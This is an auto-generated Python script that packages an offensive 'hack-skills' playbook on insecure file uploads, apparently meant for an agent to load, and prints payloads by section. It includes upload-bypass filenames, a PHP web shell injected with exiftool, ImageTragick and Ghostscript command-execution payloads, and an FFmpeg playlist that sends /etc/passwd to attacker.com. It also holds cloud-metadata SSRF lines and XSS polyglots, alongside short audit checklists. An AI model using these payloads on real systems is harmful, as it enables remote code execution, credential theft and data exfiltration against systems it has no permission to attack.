#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/upload-insecure-files

Skill: SKILL: Upload Insecure Files — Validation Bypass, Storage Abuse, and Processing Chains
Desc : >-

Run:  python hack-skills-upload-insecure-files.py --help
      python hack-skills-upload-insecure-files.py --list
      python hack-skills-upload-insecure-files.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/upload-insecure-files'
TITLE = 'SKILL: Upload Insecure Files — Validation Bypass, Storage Abuse, and Processing Chains'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: upload-insecure-files", "description: >-", "Insecure file upload playbook. Use when testing upload validation, storage paths, processing pipelines, preview behavior, overwrite risks, and upload-to-RCE chains."],
    'skill-upload-insecure-files-validation-bypass-storage-abuse-and-processing-chains': [],
    '0-related-routing': [],
    'extended-scenarios': ["Also load [SCENARIOS.md](./SCENARIOS.md) when you need:", "- IIS parsing vulnerabilities \u2014 `x.asp/` directory parsing, `;` semicolon truncation (`shell.asp;.jpg`)", "- Nginx parsing misconfiguration \u2014 `avatar.jpg/.php` with `cgi.fix_pathinfo=1`", "- Apache parsing \u2014 multiple extensions, `AddHandler`, CVE-2017-15715 `\\n` (0x0A) bypass", "- PUT method exploitation \u2014 IIS WebDAV PUT+COPY, Tomcat CVE-2017-12615 `readonly` + `.jsp/` bypass", "- WebLogic CVE-2018-2894 arbitrary file upload via Web Service Test Page", "- Apache Flink CVE-2020-17518 file upload with path traversal", "- Upload + parsing vulnerability chain \u2014 EXIF PHP code + Nginx `/.php` path info", "- Full extension bypass reference table (PHP/ASP/JSP alternatives, case variations, null bytes)", "Use this file as the deep upload workflow reference. Also load:", "- [path traversal lfi](../path-traversal-lfi/SKILL.md) when filename, extraction path, or include path becomes file-system control", "- [xss cross site scripting](../xss-cross-site-scripting/SKILL.md) when uploads are rendered in browser contexts", "- [xxe xml external entity](../xxe-xml-external-entity/SKILL.md) when SVG, OOXML, or XML imports are accepted", "- [cmdi command injection](../cmdi-command-injection/SKILL.md) when a processor, converter, or media pipeline executes system tools", "- [business logic vulnerabilities](../business-logic-vulnerabilities/SKILL.md) when quotas, overwrite rules, approvals, or storage paths create logic bugs", "- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the server is **Apache Tomcat** and the WAF blocks `.jsp` in `filename*` \u2014 Tomcat's `RFC2231Utility` narrows each char to byte, so `1.\u966asp` (U+966A low byte = `j`) writes `1.jsp` to disk while the WAF sees no `.jsp` literal"],
    '1-core-model': ["Every upload feature should be tested as four separate trust boundaries:", "1. **Accept**: what validation happens before the file is stored?", "2. **Store**: where is the file written and under what name and permissions?", "3. **Process**: what background tools, converters, scanners, parsers, or extractors touch it?", "4. **Serve**: how is it later downloaded, rendered, transformed, or shared?", "Many targets validate only one stage. The bug usually appears in a different stage than the one where the file was uploaded."],
    '2-recon-questions-first': ["Before payload selection, answer these:", "- Which extensions are allowed, denied, or normalized?", "- Does the backend trust extension, MIME type, magic bytes, or all three?", "- Is the file renamed, transcoded, unzipped, scanned, or re-hosted?", "- Is retrieval direct, proxied, signed, or served from a CDN?", "- Can one user predict or overwrite another user's file path?", "- Do filenames, metadata, or previews reflect back into HTML, logs, admin consoles, or PDFs?"],
    '3-validation-bypass-matrix': ["Representative bypass families:", "```text", "shell.php.jpg", "avatar.jpg.php", "file.asp;.jpg", "file.php%00.jpg", "file.svg", "archive.zip", "This small sample set already covers the main use cases of the former standalone upload payload helper, so no extra entry is needed for first-pass selection.", "Do not stop at upload success. Successful upload without dangerous retrieval or processing is not enough."],
    '4-storage-and-retrieval-abuse': [],
    'predictable-or-controllable-paths': ["Look for patterns like:", "```text", "/uploads/USER_ID/avatar.png", "/files/org-slug/report.pdf", "/cdn/tmp/<uuid>/<filename>", "Test for:", "- cross-tenant read by guessing IDs, slugs, or UUID patterns", "- overwrite by reusing another user's filename", "- path normalization bugs in filename or archive members", "- private file exposed through direct object URL despite UI-level access control"],
    'filename-based-injection-surfaces': ["A safe file can still be dangerous if the **filename** is reflected into:", "- gallery HTML", "- admin moderation panels", "- PDF/CSV export jobs", "- logs, audit views, or email notifications", "If filename is reflected, treat it like stored input, not like passive metadata."],
    '5-processing-chain-attacks': ["The highest-value upload bugs often live in asynchronous processors."],
    'common-processor-classes': [],
    'what-to-prove': ["1. The file is touched by a processor.", "2. The processor behaves differently from the upload validator.", "3. That difference creates impact: read, execute, overwrite, SSRF, or stored client-side execution."],
    '6-high-value-exploitation-paths': [],
    'browser-execution': ["- SVG served as active content", "- HTML or text uploads rendered inline", "- EXIF or filename reflected into an HTML page"],
    'xml-and-document-parsing': ["- SVG XXE for file read or SSRF", "- OOXML import for XML entity or parser abuse", "- CSV import for formula execution in analyst workflows"],
    'server-side-execution-or-file-system-impact': ["- image or document converter invoking shell tools", "- zip slip writing outside intended directory", "- upload-to-LFI chain where uploaded content later becomes includable"],
    'access-control-and-sharing-bugs': ["- private upload accessible via predictable URL", "- moderation or quarantine path still publicly reachable", "- one user replacing another user's public asset"],
    '7-authorization-and-business-logic-checks': ["Upload features frequently hide non-parser bugs:", "- upload quota enforced in UI but not API", "- plan restrictions checked on upload page but not on import endpoint", "- file ownership checked on list view but not on direct download or replace endpoint", "- approval workflow bypassed by calling the final storage endpoint directly", "- delete or replace action missing object-level authorization", "When the upload path includes account, project, or organization identifiers, always run an A/B authorization test."],
    '8-test-sequence': ["1. Upload one benign marker file and map rename, path, and retrieval behavior.", "2. Try one validation-bypass sample and one active-content sample.", "3. Check whether retrieval is attachment, inline render, transformed preview, or background processing.", "4. If processing exists, pivot by processor family: XSS, XXE, CMDi, zip slip, or SSRF.", "5. Run tenant-boundary and overwrite tests on file IDs, replace endpoints, and public URLs."],
    '9-chaining-map': [],
    '10-operator-checklist': ["```text", "[] Confirm accept/store/process/serve stages separately", "[] Test one extension bypass and one content-based payload", "[] Check inline render vs forced download", "[] Inspect filenames, metadata, and preview surfaces for reflection", "[] Probe processing chain: image, archive, XML, document, PDF", "[] Run A/B authorization on read, replace, delete, and share actions", "[] Map predictable paths and public/private URL boundaries"],
    '11-upload-success-rate-model-advanced-methodology': [],
    'success-rate-formula': ["P(RCE via Upload) = P(bypass_detection) \u00d7 P(obtain_path) \u00d7 P(execute_via_webserver)", "Many testers focus only on bypassing file type checks, but forget:", "- **Path discovery**: Without knowing the upload path, even a successful bypass is useless", "- **Server parsing**: Even with a `.php` file uploaded, if the web server doesn't parse it as PHP, no RCE"],
    'rich-text-editor-path-matrix': [],
    'validation-defect-taxonomy-5-dimensions': [],
    'response-manipulation-bypass': [],
    'if-server-returns-allowedtypes-in-response-for-client-side-validation': [],
    'intercept-response-modify-allowedtypes-to-include-php-upload-php': [],
    'the-server-never-actually-validates-it-trusts-client-filtering': [],
    'iis-semicolon-parsing': [],
    'iis-treats-semicolon-as-parameter-delimiter-in-filenames': ["shell.asp;.jpg    \u2192 IIS executes as ASP"],
    'ntfs-alternate-data-stream': ["shell.asp::$DATA  \u2192 Bypasses extension check, IIS may execute"],
    'apache-multi-extension': [],
    'apache-parses-right-to-left-for-handler': ["shell.php.jpg     \u2192 May execute as PHP if AddHandler php applies"],
    'newline-in-filename-cve-2017-15715': ["shell.php\\x0a     \u2192 Bypasses regex but Apache still executes as PHP"],
    'nginx-cgi-fix-pathinfo': [],
    'with-cgi-fix-pathinfo-1-php-fpm': ["/uploads/image.jpg/anything.php \u2192 PHP processes image.jpg as PHP!"],
    'upload-legitimate-looking-jpg-with-php-code-embedded': [],
    '12-polyglot-file-techniques': ["Files that are simultaneously valid in two or more formats, bypassing format-specific validation while delivering a dangerous payload."],
    'gifar-gif-jar': ["```text"],
    'gif-header-jar-appended': [],
    'gif89a-header-6-bytes-padding-jar-archive-zip-format': [],
    'browser-valid-gif-image': [],
    'java-valid-jar-archive-applet-execution-legacy': ["cat header.gif payload.jar > gifar.gif"],
    'passes-image-validation-executes-as-java-applet-if-loaded-via-applet': [],
    'png-php-polyglot': ["```bash"],
    'inject-php-code-into-png-idat-chunk-or-text-metadata': [],
    'the-png-renders-as-valid-image-when-included-via-lfi-php-code-executes': [],
    'method-1-php-in-text-chunk': ["python3 -c \"", "import struct", "png_header = b'\\x89PNG\\r\\n\\x1a\\n'"],
    'minimal-ihdr-idat-text-chunk-containing-php': [],
    'method-2-use-exiftool-to-inject-into-comment': ["exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.png"],
    'upload-image-png-lfi-include-php-executes-from-metadata': [],
    'jpeg-js-polyglot': ["```bash"],
    'jpeg-comment-marker-0xfffe-can-contain-javascript': [],
    'if-served-with-content-type-text-html-or-mime-sniffing-active': ["exiftool -Comment='<script>alert(document.domain)</script>' photo.jpg"],
    'combined-with-content-type-confusion-xss-via-image-upload': [],
    'pdf-js-polyglot': ["```text"],
    'pdf-header-followed-by-js': ["%PDF-1.0", "1 0 obj<</Pages 2 0 R>>endobj", "2 0 obj<</Kids[3 0 R]/Count 1>>endobj", "3 0 obj<</MediaBox[0 0 3 3]>>endobj", "trailer<</Root 1 0 R>>", "*/=alert('XSS')/*"],
    '13-imagemagick-exploitation-chain': [],
    'cve-2016-3714-imagetragick-rce-via-delegates': ["ImageMagick uses \"delegates\" (external programs) for certain format conversions. Specially crafted files trigger shell command execution:"],
    'mvg-magick-vector-graphics': ["```text", "push graphic-context", "viewbox 0 0 640 480", "fill 'url(https://example.com/image.jpg\"|id > /tmp/pwned\")'", "pop graphic-context"],
    'svg-delegate-abuse': ["```xml", "<?xml version=\"1.0\" standalone=\"no\"?>", "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">", "<svg width=\"640px\" height=\"480px\">", "<image xlink:href=\"https://example.com/image.jpg&quot;|id > /tmp/pwned&quot;\" x=\"0\" y=\"0\"/>", "</svg>"],
    'ghostscript-exploitation': ["ImageMagick delegates to Ghostscript for PDF/PS/EPS processing. Ghostscript has had multiple sandbox escapes:", "```postscript", "userdict /setpagedevice undef", "legal", "{ null restore } stopped { pop } if", "{ legal } stopped { pop } if", "restore", "mark /OutputFile (%pipe%id > /tmp/pwned) currentdevice putdeviceprops", "Upload as `.eps`, `.ps`, or `.pdf` \u2192 ImageMagick invokes Ghostscript \u2192 RCE."],
    'mitigation-check': ["```text", "\u25a1 Is ImageMagick policy.xml restricting dangerous coders?", "<policy domain=\"coder\" rights=\"none\" pattern=\"MVG\" />", "<policy domain=\"coder\" rights=\"none\" pattern=\"MSL\" />", "<policy domain=\"coder\" rights=\"none\" pattern=\"EPHEMERAL\" />", "<policy domain=\"coder\" rights=\"none\" pattern=\"URL\" />", "<policy domain=\"coder\" rights=\"none\" pattern=\"HTTPS\" />", "\u25a1 Is Ghostscript updated and sandboxed (-dSAFER)?"],
    '14-ffmpeg-ssrf-local-file-read': [],
    'hls-playlist-file-read': ["```m3u8", "concat:http://attacker.com/header.txt|file:///etc/passwd", "Upload as `.m3u8` or `.ts` \u2192 FFmpeg processes it \u2192 file content concatenated with header and sent to attacker server or embedded in output video."],
    'ssrf-via-hls': ["```m3u8", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "FFmpeg fetches the URL server-side \u2192 SSRF to cloud metadata endpoint."],
    'concat-protocol-for-local-file-inclusion': ["```m3u8", "concat:file:///etc/passwd|subfile,,start,0,end,0,,:"],
    'avi-subtitle-ssrf': ["Create AVI with subtitle track referencing a URL:", "```bash", "ffmpeg -i input.avi -vf \"subtitles=http://169.254.169.254/latest/meta-data/\" output.avi"],
    '15-cloud-storage-upload-considerations': [],
    's3-presigned-url-abuse': ["```text"],
    'presigned-url-generated-for-specific-key-and-content-type': ["PUT https://bucket.s3.amazonaws.com/uploads/avatar.jpg", "?X-Amz-Algorithm=AWS4-HMAC-SHA256&...&X-Amz-SignedHeaders=host;content-type"],
    'abuse-if-content-type-is-not-in-signedheaders': [],
    'change-content-type-from-image-jpeg-to-text-html-upload-xss-payload': [],
    'the-signature-remains-valid-because-content-type-wasn-t-signed': [],
    'if-path-is-not-signed-only-prefix': [],
    'change-key-from-uploads-avatar-jpg-to-uploads-admin-config-json': ["**Audit checklist**:", "```text", "\u25a1 Which headers are included in SignedHeaders? (must include content-type)", "\u25a1 Is the full key path signed or just a prefix?", "\u25a1 Is the upload bucket the same as the serving bucket? (write to CDN-served bucket \u2192 stored XSS)", "\u25a1 Is the ACL signed? (prevent setting public-read on sensitive uploads)"],
    'azure-blob-storage-sas-token': ["```text"],
    'sas-token-scope-issues': [],
    'container-level-sas-with-write-permission-write-to-any-blob-in-container': [],
    'service-level-sas-may-allow-listing-reading-other-blobs': [],
    'check-sr-signed-resource-sp-signed-permissions-se-expiry': [],
    'gcs-signed-url': ["```text"],
    'similar-to-s3-check-if-content-type-is-included-in-signature': [],
    'resumable-upload-urls-may-have-broader-permissions-than-intended': [],
    'v4-signed-urls-verify-x-goog-signedheaders-includes-content-type': [],
    '16-content-type-validation-bypass': [],
    'double-extensions': ["```text", "shell.php.jpg          \u2192 Apache with AddHandler may execute as PHP", "shell.asp;.jpg         \u2192 IIS semicolon truncation", "shell.php%00.jpg       \u2192 Null byte truncation (PHP < 5.3.4, old Java)", "shell.php.xxxxx        \u2192 Unknown extension \u2192 Apache falls back to previous handler"],
    'mime-sniffing-exploitation': ["When server sends no `Content-Type` or `X-Content-Type-Options: nosniff` is missing:", "```text"],
    'upload-file-with-html-js-content-but-image-extension': [],
    'browser-mime-sniffs-content-executes-as-html': [],
    'works-for-stored-xss-even-when-extension-validation-passes': [],
    'content-type-header-vs-extension-mismatch': ["```text"],
    'upload-request': ["Content-Disposition: form-data; name=\"file\"; filename=\"avatar.jpg\"", "Content-Type: image/jpeg"],
    'file-content-php-system-get-cmd': [],
    'server-trusts-content-type-header-image-jpeg-passes-validation': [],
    'but-stores-with-php-extension-based-on-other-logic-executes-as-php': [],
    'case-variation': ["```text", "shell.PhP    shell.pHP    shell.Php", "shell.aSp    shell.jSp    shell.ASPX"],
    'trailing-characters': ["```text", "shell.php.      \u2192 trailing dot (Windows strips it)", "shell.php::$DATA \u2192 NTFS alternate data stream (IIS)", "shell.php\\x20   \u2192 trailing space", "shell.php%20    \u2192 URL-encoded space"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()